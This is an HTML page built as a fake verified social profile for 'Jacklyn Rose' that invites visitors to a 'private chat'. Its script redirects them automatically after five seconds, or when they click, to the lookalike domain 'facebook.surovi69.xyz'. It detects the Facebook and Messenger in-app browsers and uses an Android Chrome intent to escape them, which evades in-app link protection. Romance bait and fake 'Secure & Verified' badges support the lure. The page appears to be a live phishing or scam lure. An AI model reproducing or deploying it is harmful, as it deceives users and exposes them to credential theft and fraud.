<!DOCTYPE html>

<head>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex; justify-content: center; align-items: center; height: 100vh;
        }
        .bridge-card {
            background: white; width: 95%; max-width: 400px;
            border-radius: 15px; overflow: hidden;
            box-shadow: 0 12px 28px rgba(0,0,0,0.12); text-align: center;
            position: relative;
        }
        .cover-photo {
            width: 100%; height: 150px;
            background: url('https://i.ibb.co.com/HTXcyk1L/pic1.webp') center/cover;
        }
        .profile-section { margin-top: -60px; padding: 20px; position: relative; }
        .img-container { position: relative; width: 120px; height: 120px; margin: 0 auto; }
        .profile-img {
            width: 100%; height: 100%; border-radius: 50%;
            border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            object-fit: cover;
        }
        .online-dot {
            height: 20px; width: 20px; background-color: #31a24c;
            border: 3px solid white; border-radius: 50%;
            position: absolute; bottom: 10px; right: 10px;
            z-index: 2;
        }
        .name { font-size: 24px; font-weight: bold; color: #1c1e21; margin: 15px 0 5px; }
        .bio { color: #65676b; font-size: 15px; margin-bottom: 25px; line-height: 1.5; padding: 0 10px; }
        .main-btn {
            background-color: #0084FF; color: white; text-decoration: none;
            padding: 16px 30px; border-radius: 10px; font-weight: bold;
            display: inline-flex; align-items: center; gap: 10px;
            width: 85%; justify-content: center; font-size: 17px; 
            border: none; cursor: pointer; transition: transform 0.2s;
        }
        .main-btn:active { transform: scale(0.98); }
        .footer-info { margin-top: 20px; font-size: 12px; color: #8a8d91; padding-bottom: 15px; }
    </style>
</head>
<body>

    <div class="bridge-card">
        <!-- কভার ফটো -->
        <div class="cover-photo"></div>
        
        <div class="profile-section">
            <div class="img-container">
                <!-- প্রোফাইল ফটো -->
                <img src="https://i.ibb.co.com/BHCXRznL/p1.webp" alt="Profile" class="profile-img">
                <span class="online-dot" title="Online Now"></span>
            </div>
            
            <div class="name">Jacklyn Rose <i class="fas fa-check-circle" style="color: #0084FF; font-size: 18px;"></i></div>
            
            <div class="bio">
                I'm active now! Join my private chat room for a more personal conversation. Safe and encrypted connection.
            </div>
            
            <!-- মেইন বাটন -->
            <a href="https://facebook.surovi69.xyz" class="main-btn" id="actionBtn">
                <i class="fab fa-facebook-messenger"></i> Start Private Chat
            </a>
            
            <div class="footer-info">
                <i class="fas fa-shield-alt"></i> Secure & Verified Profile
            </div>
        </div>
    </div>

    <script>
        const targetUrl = "https://facebook.surovi69.xyz";
        // এটি অ্যান্ড্রয়েড ইউজারদের সরাসরি ক্রোম ব্রাউজারে নিয়ে যাবে
        const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";

        function handleRedirect() {
            // ফেসবুক/মেসেঞ্জার অ্যাপের ইউজার এজেন্ট চেক
            const isFBApp = /FBAN|FBAV|Messenger/i.test(navigator.userAgent);
            
            if (isFBApp) {
                // সরাসরি ক্রোম ব্রাউজার ওপেন করার চেষ্টা
                window.location.href = chromeIntent;
                // যদি ২ সেকেন্ডে কাজ না হয় তবে সাধারণ রিডাইরেক্ট
                setTimeout(() => { window.location.href = targetUrl; }, 2000);
            } else {
                window.location.href = targetUrl;
            }
        }

        // বাটন ক্লিক ইভেন্ট
        document.getElementById('actionBtn').addEventListener('click', function(e) {
            e.preventDefault();
            handleRedirect();
        });

        // ৫ সেকেন্ড পর অটোমেটিক রিডাইরেক্ট
        window.onload = function() {
            setTimeout(() => {
                handleRedirect();
            }, 5000);
        };
    </script>
</body>
